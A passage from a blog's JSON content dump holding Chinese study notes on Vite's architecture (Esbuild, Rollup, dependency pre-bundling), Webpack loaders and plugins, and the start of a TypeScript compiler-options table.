/\\.s[ac]ss$/, use: [ process.env.NODE_ENV === 'production' ? MiniCssExtractPlugin .loader : 'style-loader', { loader: 'css-loader', options: { //开启CSS Modules modules: true } }, 'postcss-loader', 'sass-loader' ] }, { test: /\\.css$/, use: { process.env.NODE_ENV === 'production' ? MiniCssExtractPlugin .loader : 'style-loader', { loader: 'css-loader', options: { //开启CSS Modules modules: true } }, 'postcss-loader', }, }, ] }, plugins: [ new MiniCssExtractPlugin(), new HTMLWebpackPlugin() ] }; 等价于以下 vite.config.js 配置： import { defineConfig } from 'vite'; import vue from '@vitejs/plugin-vue'; export default defineConfig({ plugins: [vue()] }); Tree-Shaking - 树摇 用于删除 Dead Code： 代码没有被用到，不可到达 代码的执行结果不会被用到 代码只读不写 CommonJS 格式不能做到 Tree Shaking，因为 require 的部分可能依赖运行时计算的结果（例如 require(someVariable)）。优化原理: 基于 ESM 的 import/export 语句依赖关系，与运行时状态无关。 在构建阶段将未使用到的代码进行删除。 依赖预打包 避免 node modules 过多的文件请求（请求瀑布流）。例如 loadsh-es 库本身是有 ES 版本产物的，可以在 Vite 中直接运行。但实际上，它在加载时会发出特别多的请求，导致页面加载的前几秒几都乎处于卡顿状态，拿一个简单的 demo 项目举例，请求情况如下图所示： 如果在应用代码中调用了 debounce 方法，这个方法会依赖很多工具函数，如下图所示： 每个 import 都会触发一次新的文件请求，因此在这种依赖层级深、涉及模块数量多的情况下，会触发成百上千个网络请求，巨大的请求量加上 Chrome 对同一个域名下只能同时支持 6 个 HTTP 并发请求的限制，导致页面加载十分缓慢，与 Vite 主导性能优势的初衷背道而驰。不过，在进行依赖的预构建之后，lodash-es 这个库的代码被打包成了一个文件，这样请求的数量会骤然减少，页面加载也快了许多。下图是进行预构建之后的请求情况： 将 CommonJs 格式转换为 ESM 格式。Vite 是基于浏览器原生 ES 模块规范实现的 Dev Server，不论是应用代码，还是第三方依赖的代码，符合 ESM 规范才能够正常运行。 我们没有办法控制第三方的打包规范。就目前来看，还有相当多的第三方库仍然没有 ES 版本的产物，比如 react： // react 入口文件 // 只有 CommonJS 格式 if (process.env.NODE_ENV === &quot;production&quot;) { module.exports = require(&quot;./cjs/react.production.min.js&quot;); } else { module.exports = require(&quot;./cjs/react.development.js&quot;); } 这种 CommonJS 格式的代码在 Vite 当中无法直接运行，所以需要将它转换成 ESM 格式的产物，使其在浏览器可以通过 &lt;script type=&quot;module&quot;&gt;&lt;script&gt; 的方式正常加载。 实现原理： 服务启动前扫描代码中用到的依赖。 使用 Esbuild 对依赖代码进行预打包（Vite 1.x 使用了 Rollup 来进行依赖预构建，在 2.x 版本将 Rollup 换成了 Esbuild，编译速度提升了近 100 倍）。 改写 import 语句，指定依赖为预构建产物路径。 Vite 架构 Vite 并不是简单地开发阶段使用 Esbuild，生产环境用 Rollup，下面是 Vite 架构图： 性能利器 - Esbuild Vite 将 Esbuild 作为自己的性能利器，将 Esbuild 各个垂直方向的能力（Bundler、Transformer、Minifier）利用的淋漓尽致，给 Vite 的高性能提供了有力的保证。 作为 Bundle 工具 首先是开发阶段的依赖预构建阶段。 node_modules 依赖的大小动辄几百 MB 甚至上 GB ，会远超项目源代码。如果这些依赖直接在 Vite 中使用，会出现一系列的问题，所以对于第三方依赖，需要在应用启动前进行打包并且转换为 ESM 格式。 Vite 1.x 使用了 Rollup 来进行依赖预构建，在 2.x 版本将 Rollup 换成了 Esbuild，编译速度提升了近 100 倍。 但是 Esbuild 作为打包工具也有一些缺点。 不支持语法降级到 ES5，这意味着在低端浏览器代码会跑不起来 不支持 const enum 等语法，这意味着单独使用这些语法在 esbuild 中会直接抛错。 不提供操作打包产物的接口，像 Rollup 中灵活处理打包产物的能力(如 renderChunk 钩子)在 Esbuild 当中完全没有。 不支持自定义 Code Splitting 策略。传统的 Webpack 和 Rollup 都提供了自定义拆包策略的 API，而 Esbuild 并未提供，从而降低了拆包优化的灵活性。 编译工具 在依赖预构建阶段，Esbuild 作为 Bundler 的角色存在。而在 TS(X)/JS(X) 单文件编译上面，Vite 也使用 Esbuild 进行语法转译，也就是将 Esbuild 作为 Transformer 来用。Esbuild 转译 TS 或者 JSX 的能力通过 Vite 插件提供，这个 Vite 插件在开发环境和生产环境都会执行，可以在架构图中 Vite Plugin Pipeline 部分注意到： 这部分能力 Esbuild 替换原先的 Babel 或者 TSC 的功能，因为无论是 Babel 还是 TSC 都有性能问题。当 Vite 使用 Esbuild 做单文件编译之后，提升可以说相当大了，我们以一个巨大的、50 多 MB 的纯代码文件为例，来对比 Esbuild、Babel、TSC 包括 SWC 的编译性能： 虽然 Esbuild Transfomer 能带来巨大的性能提升，但其自身也有局限性，最大的局限性就在于 TS 中的类型检查问题。这是因为 Esbuild 并没有实现 TS 的类型系统，在编译 TS(或者 TSX) 文件时仅仅抹掉了类型相关的代码，暂时没有能力实现类型检查。所以 vite build 之前会先执行 tsc 命令，也就是借助 TS 官方的编译器进行类型检查。 要解决类型问题，可以通过使用 TS 的编辑器插件，在开发阶段就能早早把问题暴露出来并解决，不至于等到项目要打包上线的时候。 压缩工具 Vite 从 2.6 版本开始，就官宣默认使用 Esbuild 来进行生产环境的代码压缩，包括 JS 代码和 CSS 代码。从架构图中可以看到，在生产环境中 Esbuild 压缩器通过插件的形式融入到了 Rollup 的打包流程中： 传统的方式都是使用 Terser 这种 JS 开发的压缩器来实现，在 Webpack 或者 Rollup 中作为一个 Plugin 来完成代码打包后的压缩混淆的工作。但 Terser 其实很慢，主要有 2 个原因： 压缩这项工作涉及大量 AST 操作，并且在传统的构建流程中，AST 在各个工具之间无法共享，比如 Terser 就无法与 Babel 共享同一个 AST，造成了很多重复解析的过程。 JS 本身属于解释性 + JIT（即时编译） 的语言，对于压缩这种 CPU 密集型的工作，其性能远远比不上 Golang 这种原生语言。 因此，Esbuild 这种从头到尾共享 AST 以及原生语言编写的 Minifier 在性能上能够甩开传统工具的好几十倍。可以看下面这个大型库 echarts 的压缩性能测试： 压缩一个大小为 3.2 MB 的库，Terser 需要耗费 8798 ms，而 Esbuild 仅仅需要 361 ms，压缩效率较 Terser 提升了二三十倍，并且产物的体积几乎没有劣化，因此 Vite 果断将其内置为默认的压缩方案。 构建基石 - Rollup Rollup 既是 Vite 用作生产环境打包的核心工具，也直接决定了 Vite 插件机制的设计。 生产环境 Bundle 生产环境无法做到完全 no-bundle，因为会有网络性能问题。为了在生产环境中也能取得优秀的产物性能，Vite 默认选择在生产环境中利用 Rollup 打包，并基于 Rollup 本身成熟的打包能力进行扩展和优化，主要包含 3 个方面： CSS 代码分割。如果某个异步模块中引入了一些 CSS 代码，Vite 就会自动将这些 CSS 抽取出来生成单独的文件，提高线上产物的缓存复用率。 自动预加载。Vite 会自动为入口 chunk 的依赖自动生成预加载标签 &lt;link rel=&quot;modulepreload&quot;&gt;，这种适当预加载的做法会让浏览器提前下载好资源，优化页面性能。 &lt;head&gt; &lt;!-- 省略其它内容 --&gt; &lt;!-- 入口 chunk --&gt; &lt;script type=&quot;module&quot; crossorigin src=&quot;/assets/index.250e0340.js&quot;&gt;&lt;/script&gt; &lt;!-- 自动预加载入口 chunk 所依赖的 chunk--&gt; &lt;link rel=&quot;modulepreload&quot; href=&quot;/assets/vendor.293dca09.js&quot;&gt; &lt;/head&gt; 异步 Chunk 加载优化。在异步引入的 Chunk 中，通常会有一些公用的模块，如现有两个异步引入的 Chunk: A 和 B，而且两者有一个公共依赖 C： 一般情况下，Rollup 打包之后，会先请求 A，然后浏览器再加载 A 的过程中才决定请求和加载 C，但 Vite 进行优化之后，请求 A 的同时会自动预加载 C，通过优化 Rollup 产物依赖加载方式节省了不必要的网络开销。 插件机制 无论是开发阶段还是生产环境，Vite 都根植于 Rollup 的插件机制和生态。 开发阶段使用 Plugin Container，用来模拟 Rollup 调度各个 Vite 插件的执行逻辑 生产环境直接使用 Rollup 但不是 Rollup 的插件都可以使用到 Vite 中，插件兼容性具体可查阅 https://vite-rollup-plugins.patak.dev/。 总结 Esbuild 作为构建的性能利器，Vite 利用其 Bundler 的功能进行依赖预构建，用其 Transformer 的能力进行 TS 和 JSX 文件的转译，也用到它的压缩能力进行 JS 和 CSS 代码的压缩。 无论是插件机制、还是底层的打包手段，都基于 Rollup 来实现，可以说 Vite 是对于 Rollup 一种场景化的深度扩展，将 Rollup 从传统的 JS 库打包场景扩展至完整 Web 应用打包。 使用 Vite 项目初始化。 #提前安装 pnpm npm i -g pnpm #初始化命令 pnpm create vite #安装依赖 pnpm install #启动项目 pnpm run dev 然后我们在浏览器中打开 http://localhost:5173 页面，你可以看到： 至此，我们成功搭建起了一个 React 前端项目。怎么样？利用 Vite 来初始化一个前端项目是不是非常简单？经过初步尝试，Vite 给人的第一感觉就是简洁、轻量、快速。拿 react 官方基于 Webpack 的脚手架 create-react-app，也就是大家常说的 cra 来测试，从项目初始化到依赖安装所花的时间与 Vite 对比如下: 现在，项目的目录结构如下: . ├── index.html ├── package.json ├── pnpm-lock.yaml ├── assets │ └── react.svg ├── public │ └── vite.svg ├── src │ ├── App.css │ ├── App.tsx │ ├── index.css │ ├── main.tsx │ └── vite-env.d.ts ├── tsconfig.json └── vite.config.ts 在项目根目录中有一个 index.html 文件，这个文件十分关键，因为 Vite 默认会把项目根目录下的 index.html 作为入口文件。也就是说，当你访问 http://localhost:5173 的时候，Vite 的 Dev Server 会自动返回这个 HTML 文件的内容。我们来看看这个 HTML: &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; /&gt; &lt;link rel=&quot;icon&quot; type=&quot;image/svg+xml&quot; href=&quot;/vite.svg&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;title&gt;Vite + React + TS&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; &lt;script type=&quot;module&quot; src=&quot;/src/main.tsx&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 可以看到这个 HTML 文件的内容非常简洁，在 body 标签中除了 id=&quot;root&quot; 的根节点之外，还包含了一个声明了 type=&quot;module&quot; 的 script 标签: &lt;script type=&quot;module&quot; src=&quot;/src/main.tsx&quot;&gt;&lt;/script&gt; 上面的 script 标签声明了 type=&quot;module&quot;，同时 src 指向了/src/main.tsx文件，此时相当于请求了 http://localhost:5173/src/main.tsx 这个资源，Vite 的 Dev Server 此时会接收到这个请求，然后读取对应的文件内容，进行一定的中间处理，最后将处理的结果返回给浏览器。main.tsx 的内容如下: import React from 'react' import ReactDOM from 'react-dom/client' import App from './App' import './index.css' ReactDOM.createRoot(document.getElementById('root') as HTMLElement).render( &lt;React.StrictMode&gt; &lt;App /&gt; &lt;/React.StrictMode&gt;, ) 浏览器并不识别 tsx 语法，也无法直接 import css 文件，上面这段代码究竟是如何被浏览器正常执行的呢？这就归功了 Vite Dev Server 所做的“中间处理”了，也就是说，在读取到 main.tsx 文件的内容之后，Vite 会对文件的内容进行编译，大家可以从 Chrome 的网络调试面板看到编译后的结果: 这里 Vite 会将项目的源代码编译成浏览器可以识别的代码，一个 import 语句即代表一个 HTTP 请求，例如下面： import App from '/src/App.tsx'; import '/src/index.css'; 正是 Vite 的 Dev Server 来接收这些请求、进行文件转译，返回浏览器可以解析运行的代码。当浏览器解析到新的 import 语句，又会发出新的请求，以此类推，直到所有的资源都加载完成。所以，no-bundle 的真正含义：利用浏览器原生 ES 模块的支持，实现开发阶段的 Dev Server，进行模块的按需加载，而不是先整体打包再进行加载。相比 Webpack 这种必须打包再加载的传统构建模式，Vite 在开发阶段省略了繁琐且耗时的打包过程。 配置 可以通过两种方式来对 Vite 进行配置，一是通过命令行参数，例如 vite --port=8888，二是通过配置文件，一般情况下，大多数的配置都通过配置文件的方式来声明。支持多种配置文件类型，包括 .js、.ts、.mjs 三种后缀的文件，脚手架项目中的配置 vite.config.ts 如下： import { defineConfig } from 'vite' import react from '@vitejs/plugin-react' // https://vitejs.dev/config/ export default defineConfig({ plugins: [react()], }) 可以看到配置文件中默认在 plugins 数组中配置了官方的 react 插件，来提供 React 项目编译和热更新的功能。 配置案例 如果页面的入口文件 index.html 并不在项目根目录下，而需要放到 src 目录下，如何在访问 localhost:5173 的时候让 Vite 自动返回 src 目录下的 index.html 呢？我们可以通过 root 参数配置项目根目录的位置: // vite.config.ts import { defineConfig } from 'vite' // 引入 path 包注意两点: // 1. 为避免类型报错，你需要通过 `pnpm i @types/node -D` 安装类型 // 2. tsconfig.node.json 中设置 `allowSyntheticDefaultImports: true`，以允许下面的 default 导入方式 import path from 'path' import react from '@vitejs/plugin-react' export default defineConfig({ // 手动指定项目根目录位置 root: path.join(__dirname, 'src') plugins: [react()] }) 当手动指定 root 参数之后，Vite 会自动从这个路径下寻找 index.html 文件，也就是说当我直接访问 localhost:5173 的时候，Vite 从 src 目录下读取入口文件，这样就成功实现了刚才的需求。 使用 Sass/Scss &amp; CSS Modules 安装 Sass，pnpm i sass -D。 新建文件夹 components/Header，文件 index.tsx、index.module.scss。 ├── src │ ├── App.css │ ├── App.tsx │ ├── components │ ├── Header │ ├── index.module.scss │ ├── index.tsx │ ├── index.css │ ├── main.tsx │ └── vite-env.d.ts index.module.scss .header { color: red; } index.tsx import styles from './index.module.scss'; //使用CSS Modules模块化方案，防止className命名冲突 export function Header() { return &lt;p className={styles.header}&gt;This is Header&lt;/p&gt; }; 使用静态资源 在 Vite 的配置文件中配置一下别名，方便后续的图片引入。 import path from 'path'; // ... { resolve: { // 别名配置 alias: { '@assets': path.join(__dirname, 'src/assets') } } } 这样 Vite 在遇到 @assets 路径的时候，会自动帮我们定位至根目录下的 src/assets 目录。值得注意的是，alias 别名配置不仅在 JavaScript 的 import 语句中生效，在 CSS 代码的 @import 和 url 导入语句中也同样生效。 以 svg 图片为例，在 App.tsx 文件中导入一个静态资源会返回解析后的 URL，然后可以通过单花括号包裹，将其赋值给 img 元素的 src 属性。 import { Header } from &quot;./components/Header&quot;; import logoUrl from './assets/react.svg'; import './App.css' function App() { return ( &lt;div&gt; &lt;img src={logoUrl} className=&quot;logo react&quot; alt=&quot;React logo&quot; /&gt; &lt;Header /&gt; &lt;/div&gt; ) } export default App; 除了常见的图片格式，Vite 也内置了对于 JSON、Worker、WASM 资源的加载支持。例如，对于 JSON 文件的解析，底层使用 @rollup/pluginutils 的 dataToEsm 方法将 JSON 对象转换为一个包含各种具名导出的 ES 模块： import { version } from '../../../package.json'; 也可以在配置文件禁用按名导入的方式: // vite.config.ts // ... { json: { stringify: true } } 这样会将 JSON 的内容解析为 export default JSON.parse(&quot;xxx&quot;)，这样会失去按名导出的能力，不过在 JSON 数据量比较大的时候，可以优化解析性能。 如果项目中还存在其它格式的静态资源，还可以通过 assetsInclude 配置让 Vite 来支持加载： // vite.config.ts // ... { assetsInclude: ['.gltf'] } Vite 中引入静态资源时，也支持在路径最后加上一些特殊的 query 后缀，包括: ?url：表示获取资源的路径，这在只想获取文件路径而不是内容的场景将会很有用。 ?raw：表示获取资源的字符串内容，如果你只想拿到资源的原始内容，可以使用这个后缀。 ?inline：表示资源强制内联，而不是打包成单独的文件。 ?worker：加载为 Web Worker。 ?worker&amp;inline：在构建时 Web Worker 内联为 base64 字符串。 生产环境构建 在开发阶段 Vite 通过 Dev Server 实现了不打包的特性，而在生产环境中，Vite 依然会基于 Rollup 进行打包，并采取一系列的打包优化手段。在脚手架项目的 package.json 中： &quot;scripts&quot;: { // 开发阶段启动 Vite Dev Server &quot;dev&quot;: &quot;vite&quot;, // 生产环境打包 &quot;build&quot;: &quot;tsc &amp;&amp; vite build&quot;, // 生产环境打包完预览产物 &quot;preview&quot;: &quot;vite preview&quot; }, 其中的 build 命令就是 Vite 专门用来进行生产环境打包的。为什么在 vite build 命令执行之前要先执行 tsc 呢？ tsc 作为 TypeScript 的官方编译命令，可以用来编译 TypeScript 代码并进行类型检查，而这里的作用主要是用来做类型检查（Esbuild 不支持类型检查），我们可以从项目的 tsconfig.json 中看到配置： { &quot;compilerOptions&quot;: { // 省略其他配置 // 1. noEmit 表示只做类型检查，而不会输出产物文件 // 2. 这行配置与 tsc --noEmit 命令等效 &quot;noEmit&quot;: true, }, } 虽然 Vite 提供了开箱即用的 TypeScript 以及 JSX 的编译能力，但实际上底层并没有实现 TypeScript 的类型校验系统，因此需要借助 tsc 来完成类型校验（在 Vue 项目中使用 vue-tsc 这个工具来完成），在打包前提早暴露出类型相关的问题，保证代码的健壮性。 执行一下 pnpm run build： 此时 Vite 就生成了最终的打包产物，我们可以通过 pnpm run preview 命令预览一下打包产物的执行效果。 在浏览器中打开 http://localhost:4173 地址，将看到和开发阶段一样的页面内容，证明我们成功完成了 Vite 项目的生产环境构建。 ","link":"https://zkrisj.github.io/post/vite-zhi-shi-ti-xi-jian-dan-zong-jie-or-qing-xun-ying-bi-ji/"},{"title":"Webpack 知识体系总结 ｜ 青训营笔记","content":"Webpack 介绍 一个前端项目是由 CSS 样式文件、图片文件、JS 文件、Vue 文件、TS 文件、JSX 文件等部分组成。我们可以手动管理这些资源： 如果资源文件过多，手工操作流程繁琐。 当文件之间有依赖关系时，必须严格按依赖顺序书写。 开发与生产环境需要一致，难以接入 JS 和 TS 的新特性。 比较难接入 Less、Sass 等。 JS、图片、CSS 资源管理模型不一致。 2009年诞生的 Node.js 和2010年诞生的 npm 将前端项目带入了工程化，而 Node.js 的 CommonJS 模块化规范不兼容浏览器。所以相继出现了一些打包工具，比如 Browserify、Gulp、RequireJS、Rollup、Webpack 等。 Webpack 本质上是一种前端资源编译、打包工具。 多份资源文件打包成一个 Bundle，减少 http 请求数 支持 Babel、Eslint、TS、CoffeScript、Less、Sass 支持模块化处理 CSS、图片等资源文件 统一图片、CSS、字体等其它资源的处理模型 支持 HMR + 开发服务器 支持持续监听、持续构建 支持代码分离支持 Tree-shaking 支持 SourceMap 核心流程： 入口处理：编译入口，webpack 编译的起点，从 entry 文件开始，启动编译流程。 依赖解析：从 entry 文件开始，根据 require 或 import 等语句找到依赖资源。 资源解析：根据 module 配置项，调用资源转移器，将图片、CSS 等非标准 JS 资源转译为 JS 内容。webpack 内部所有资源都会以 module 对象形式存在，所有关于资源的操作、转译、合并都是以 module 为基本单位进行的。 资源合并打包：将转译后的资源内容合并打包为可直接在浏览器运行的 JS 文件。 其中，2、3 步骤会递归调用，直到所有资源处理完毕。 使用 关于 Webpack 的使用方法，基本都围绕配置展开，而这些配置大致可划分为两类： 流程类: 作用于流程中某个或若干个环节直接影响打包效果的配置项。 输入: entry、context 模块解析: resolve、externals 模块转译: module 后处理: optimization、mode、target 输出：output 工具类: 主流程之外，提供更多工程化能力的配置项。 开发效率类：watch、devtool、devServer 性能优化类：cache、performance 日志类：stats、infrastructureLogging 首先，npm i -D webpack webpack-cli 安装。 定义入口和产物出口。 const path = require(&quot;path&quot;); module.exports = { entry: &quot;./src/index&quot;, output: { filename:&quot;[name].js&quot;, path: path.join(__dirname,&quot;./dist&quot;), }, } 安装 loader 处理 CSS，npm add -D css-loader style-loader。 webpack.config.js const path = require(&quot;path&quot;); module.exports = { entry:&quot;./src/index&quot;, output: { filename: &quot;[name].js&quot;, path: path.join(__dirname, &quot;./dist&quot;), }, module: { // css 处理器 rules: [{ test: /\\.css/i, use: [ &quot;style-loader&quot;, &quot;css-loader&quot;, ] }], }, }; index.js const styles = require('./index.css'); // or import styles from './index.css'; 安装 loader 接入 Babel，npm i -D @babel/core ababel/preset-env babel-loader。 webpack.config.js const path = require(&quot;path&quot;); module.exports = { entry:&quot;./src/index&quot;, output: { filename: &quot;[name].js&quot;, path: path.join(__dirname, &quot;./dist&quot;), }, module: { // Babel 处理器 rules: [{ test: /\\.js?$/, use: [{ loader: 'babel-loader', options: { presets: [ ['@babel/preset-env'] ] } }, ] }], }, }; index.js class Person { constructor() { this.name = 'Tecvan'; } } console.log((new Person()).name); const say = () =&gt; {}; 生成 HTML 需要使用的是插件，npm i -D html-webpack-plugin。 webpack.config.js const path = require(&quot;path&quot;); const HtmlWebpackPlugin = require('html-webpack-plugin'); module.exports = { entry:&quot;./src/index&quot;, output: { filename: &quot;[name].js&quot;, path: path.join(__dirname, &quot;./dist&quot;), }, plugins: [new HtmlWebpackplugin()] }; index.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;&gt; &lt;script defer src=&quot;main.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; Hot Module Replacement（HMR） - 模块热替换。 webpack.config.js const path = require(&quot;path&quot;); module.exports = { // ... watch: true, devServer: { hot: true, open: true } }; 命令需要带 serve：npx webpack serve。 Tree-Shaking -树摇，用于删除 Dead Code： 代码没有被用到，不可到达 代码的执行结果不会被用到 代码只读不写 webpack.config.js const path = require(&quot;path&quot;); module.exports = { // ... mode: &quot;production&quot;, optimization: { usedExports: true, } }; 对工具类库如 Lodash 有奇效。 Loader 为了处理非标准 JS 资源，设计出资源翻译模块 Loader，最核心的只能是实现内容转换器 —— 将各式各样的资源转化为标准 JavaScript 内容格式，例如： less-loader: 实现 less =&gt; css 的转换，输出 css 内容，无法被直接应用在 Webpack 体系下。 css-loader：将 css 转换为 __WEBPACK_DEFAULT_EXPORT__ = &quot;.a { xxx }&quot; 格式。 style-loader：将 css 模块包进 require 语句，并在运行时调用 iniectStyle 等函数将内容注入到页面的 link，style 标签，并挂载到 html 中，让 css 代码能够正确运行在浏览器上。 html-loader：将 html 转换为 __WEBPACK_DEFAULT_EXPORT__ = &quot;&lt;!DOCTYPE html&quot; 格式。 vue-loader：更复杂一些，会将 .vue 文件转化为多个 JavaScript 函数，分别对应 template、js、css、custom block。 webpack.config.js const path = require(&quot;path&quot;); module.exports = { entry:&quot;./src/index&quot;, output: { filename: &quot;[name].js&quot;, path: path.join(__dirname, &quot;./dist&quot;), }, module: { // css 处理器 rules: [{ test: /\\.less/i, use: [ &quot;style-loader&quot;, &quot;css-loader&quot;, &quot;less-loader&quot;, ] }], }, }; index.js import styles from './a.less'; 如何编写 loader Loader 通常是一个函数，结构如下： module.exports = function(source, sourceMap?, data?) { // source 为 loader 的输入，可能是文件内容，也可能是上一个 loader 处理结果 return source; }; Loader 函数接收三个参数，分别为： source：资源输入，对于第一个执行的 loader 为资源文件的内容；后续执行的 loader 则为前一个 loader 的执行结果。 sourceMap: 可选参数，代码的 sourcemap 结构。 data: 可选参数，其它需要在 Loader 链中传递的信息，比如 posthtml/posthtml-loader 就会通过这个参数传递参数的 AST 对象。 其中 source 是最重要的参数，大多数 Loader 要做的事情就是将 source 转译为另一种形式的 output ，比如 webpack-contrib/raw-loader 的核心源码： //... export default function rawLoader(source) { // ... const json = JSON.stringify(source) .replace(/\\u2028/g, '\\u2028') .replace(/\\u2029/g, '\\u2029'); const esModule = typeof options.esModule !== 'undefined' ? options.esModule : true; return `${esModule ? 'export default' : 'module.exports ='} ${json};`; } 这段代码的作用是将文本内容包裹成 JavaScript 模块，例如： // source I am Tecvan // output module.exports = &quot;I am Tecvan&quot; 经过模块化包装之后，这段文本内容转身变成 Webpack 可以处理的资源模块，其它 module 也就能引用、使用它了。 上例通过 return 语句返回处理结果，除此之外 Loader 还可以以 callback 方式返回更多信息，供下游 Loader 或者 Webpack 本身使用，例如在 webpack-contrib/eslint-loader 中： export default function loader(content, map) { // ... linter.printOutput(linter.lint(content)); this.callback(null, content, map); } 通过 this.callback(null, content, map) 语句同时返回转译后的内容与 sourcemap 内容。callback 的完整签名如下： this.callback( // 异常信息，Loader 正常运行时传递 null 值即可 err: Error | null, // 转译结果 content: string | Buffer, // 源码的 sourcemap 信息 sourceMap ? : SourceMap, // 任意需要在 Loader 间传递的值 // 经常用来传递 ast 对象，避免重复解析 data ? : any ); 插件 前端社区里很多有名的框架都各自有一套插件架构，例如 axios、quill、vscode、webpack、vue、rollup 等等。插件架构灵活性高，扩展性强，但是通常需要非常强的架构能力，需要至少解决三个方面的问题： 接口：需要提供一套逻辑接入方法，让开发者能够将逻辑在特定时机插入特定位置 输入：如何将上下文信息高效传导给插件 输出：插件内部通过何种方式影响整套运行体系 针对这些问题，webpack 为开发者提供了基于 tapable 钩子的插件方案： 编译过程的特定节点以钩子形式，通知插件此刻正在发生什么事情； 通过 tapable 提供的回调机制，以参数方式传递上下文信息； 在上下文参数对象中附带了很多存在 side effect 的交互接口，插件可以通过这些接口改变 与 Loader 区别 都是 Webpack 的扩展机制。 Loader 是一个函数，负责代码的转换、编译。在 webpack 读取模块内容之后，生成 AST 语法树之前进行。操作的是文件，比如将 A.scss 转换为 A.css，是单纯的文件转换过程。 插件是一个类，利用 webpack 提供的 hooks，当什么时，执行什么。可以在 webpack 整个打包过程中进行。功能更强，能够在各个对象的钩子中插入特化处理逻辑，它可以覆盖 Webpack 全生命流程，能力、灵活性、复杂度都会比 Loader 强很多。甚至，Webpack 本身的很多功能也是基于插件实现的。不直接操作文件，而是基于事件机制工作，会监听 webpack 打包过程中的某些事件钩子，执行任务。通过 plugin 可以访问 compliler 和 compilation 过程，通过钩子拦截 webpack 的执行。 使用 html-webpack-plugin + DefinePlugin const path = require(&quot;path&quot;); const HtmlWebpackPlugin = require('html-webpack-plugin'); module.exports = { entry:&quot;./src/index&quot;, output: { filename: &quot;[name].js&quot;, path: path.join(__dirname, &quot;./dist&quot;), }, plugins: [ new HtmlWebpackplugin(), new webpack.DefinePlugin({ PRODUCTION: JSON.stringify(true), VERSION: JSON.stringify('5fa3b9') } ] }; 如何编写插件 Webpack 的插件体系是一种基于 Tapable 实现的强耦合架构。 它在特定时机触发钩子时会附带上足够的上下文信息，插件定义的钩子回调中，能也只能与这些上下文背后的数据结构、接口交互产生 side effect（副作用），进而影响到编译状态和后续流程。 从形态上看，插件通常是一个带有 apply 函数的类： class SomePlugin { apply(compiler) {} } Webpack 会在启动后按照注册的顺序逐次调用插件对象的 apply 函数，同时传入编译器对象 compiler ，插件开发者可以以此为起点触达到 webpack 内部定义的任意钩子，例如： class SomePlugin { apply(compiler) { compiler.hooks.thisCompilation.tap('SomePlugin', (compilation, params) =&gt; { }) } } thisCompilation 为 tapable 仓库提供的钩子对象。 tap 为订阅函数，用于注册回调。 compilation、params 参数是 webpack 传递给插件的上下文信息，也是插件能拿到的输入。不同钩子会传递不同的上下文对象，这一点在钩子被创建的时候就定下来了。 钩子的核心信息： 时机: 编译过程的特定节点，Webpack 会以钩子形式通知插件此刻正在发生什么事情。 上下文: 通过 tapable 提供的回调机制，以参数方式传递上下文信息。 交互: 在上下文参数对象中附带了很多存在副作用的交互接口，插件可以通过这些接口改变。 class EntryPlugin { apply(compiler) { compiler.hooks.compilation.tap( &quot;Entryplugin&quot;, (compilation, { normalModuleFactory }) =&gt; { compilation.dependencyFactories.set( EntryDependency, normalModuleFactory ); } ); compiler.hooks.make.tapAsync(&quot;EntryPlugin&quot;, (compilation, callback) =&gt; { const { entry, options, context } = this; const dep = EntryPlugin.createDependency(entry, options); compilation.addEntry(context, dep, options, (err) =&gt; { callback(err); }); }); } } 时机：compier.hooks.compilation。 参数：compilation、callback 等。 交互：dependencyFactories.set。 ","link":"https://zkrisj.github.io/post/webpack-zhi-shi-ti-xi-jian-dan-zong-jie-or-qing-xun-ying-bi-ji/"},{"title":"TypeScript 编译选项、声明文件 ｜ 青训营笔记","content":"TypeScript 介绍 TypeScript 是 JavaScript 的超集，提供了 JavaScript 的所有功能，并提供了可选的静态类型、Mixin、类、接口和泛型等特性。 TypeScript 的目标是通过其类型系统帮助及早发现错误并提高 JavaScript 开发效率。 通过 TypeScript 编译器或 Babel 转码器转译为 JavaScript 代码，可运行在任何浏览器，任何操作系统。 任何现有的 JavaScript 程序都可以运行在 TypeScript 环境中，并只对其中的 TypeScript 代码进行编译。 在完整保留 JavaScript 运行时行为的基础上，通过引入静态类型定义来提高代码的可维护性，减少可能出现的 bug。 永远不会改变 JavaScript 代码的运行时行为，例如数字除以零等于 Infinity。这意味着，如果将代码从 JavaScript 迁移到 TypeScript ，即使 TypeScript 认为代码有类型错误，也可以保证以相同的方式运行。 对 JavaScript 类型进行了扩展，增加了例如 any、unknown、never、void。 一旦 TypeScript 的编译器完成了检查代码的工作，它就会 擦除 类型以生成最终的“已编译”代码。这意味着一旦代码被编译，生成的普通 JS 代码便没有类型信息。这也意味着 TypeScript 绝不会根据它推断的类型更改程序的 行为。最重要的是，尽管可能会在编译过程中看到类型错误，但类型系统自身与程序如何运行无关。 在较大型的项目中，可以在单独的文件 tsconfig.json 中声明 TypeScript 编译器的配置，并细化地调整其工作方式、严格程度、以及将编译后的文件存储在何处。 编译选项 TypeScript 提供了很多不同功能的编译选项，既可以通过配置 tsconfig.json 文件中的 compilerOptions 属性来实现编译，也可以使用在 tsc 命令后跟随参数这种形式，直接编译 .ts 文件。 以下这些选项可以同时在命令行和 tsconfig.json 里使用。 选项 类型 默认值 描述 –-allowJs boolean false 允许编译 JavaScript 文件 –-allowSyntheticDefaultImports boolean false 允许从没有设置默认导出的模块中默认导入 –-allowUnreachableCode boolean false 不报告执行不到的代码错误 –-allowUnusedLabels boolean false 不报告未使用的标签错误 –-alwaysStrict boolean false 以严格模式解析并为每个源文件生成 &quot;use strict&quot; 语句 -–checkJs boolean false 在 .js 文件中报告错误，与 --allowJs 配合使用 -–declaration -d boolean false 生成相应的 .d.ts 文件 -–declarationDir string 生成声明文件的输出路径 -–diagnostics boolean false 显示诊断信息 –-experimentalDecorators boolean false 启用实验性的ES装饰器 –-extendedDiagnostics boolean false 显示详细的诊断信息 –-forceConsistentCasingInFileNames boolean false 